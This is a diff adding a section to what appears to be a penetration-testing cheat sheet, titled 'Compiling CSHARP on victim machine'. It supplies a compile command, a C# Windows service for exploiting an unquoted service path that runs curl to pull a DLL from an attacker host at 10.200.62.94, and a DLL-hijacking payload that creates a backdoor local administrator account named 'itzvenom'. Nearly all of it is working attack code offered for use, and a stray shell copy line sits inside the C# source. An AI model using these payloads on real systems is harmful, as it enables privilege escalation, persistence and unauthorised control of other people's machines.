@@ -1856,10 +1856,50 @@ kerberos::golden /user: /domain: /sid: /krbtgt: /id:
 
 ----------------
 
+### Compiling CSHARP on victim machine
 
+------------------
 
+- Run-:
 
+```cmd
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:DH.exe svc.cs
+```
 
+- Code-:
+
+```cs
+// svc.cs (stage 2)
+//unquoted path
+//run with C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:DH.exe svc.cs
+copy DH.exe "C:\Program Files\Darkhaven Kiosk Services\DH.exe"
+using System;
+using System.Diagnostics;
+using System.ServiceProcess;
+
+public class SVC : ServiceBase {
+    protected override void OnStart(string[] args) {
+        Process.Start("cmd.exe", "/c curl 10.200.62.94:8000/dhlog.dll -o C:\\DarkhavenTools\\logs\\dhlog.dll");
+        System.Threading.Thread.Sleep(3000);
+        Stop();
+    }
+    static void Main() { ServiceBase.Run(new SVC()); }
+}
+```
+
+- Dll hijacking-:
+
+```c
+// dhlog.c
+//run x86_64-w64-mingw32-gcc -shared -o dhlog.dll dhlog.c
+#include <windows.h>
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        system("cmd /c net user itzvenom Password123! /add && net localgroup administrators itzvenom /add");
+    }
+    return TRUE;
+}
+```
 
 
 
